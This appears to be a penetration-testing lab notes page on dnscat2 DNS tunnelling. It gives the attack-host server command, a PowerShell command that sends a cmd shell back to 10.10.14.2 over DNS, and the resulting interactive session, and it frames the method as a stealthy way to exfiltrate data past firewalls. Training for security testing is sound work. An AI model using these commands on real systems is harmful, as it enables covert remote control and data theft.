---
description: A tunneling tool that uses DNS protocol to send data between two hosts
---

# DNS Tunneling with Dnscat2

Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic.

**Starting the dnscat2 server**

```shell-session
# Beware of the spaces between commas cuz I tried with spaces and it didn't work
sudo ruby dnscat2.rb --dns host=10.10.14.2,port=53,domain=inlanefreight.local --no-cache
```

After running the command in the server (Attack host) we will receive a secret key, the key has to be passed into the client (windows host) while running client side dnscat2 ([dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell))

**Importing dnscat2.ps1**

```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```

**Send back a CMD shell session**

```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.2 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

* \-PreSharedSecret -> is the secret key mentioned eirlier.

**Listing dnscat2 Options**

```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

**Interacting with the Established Session**

```shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```











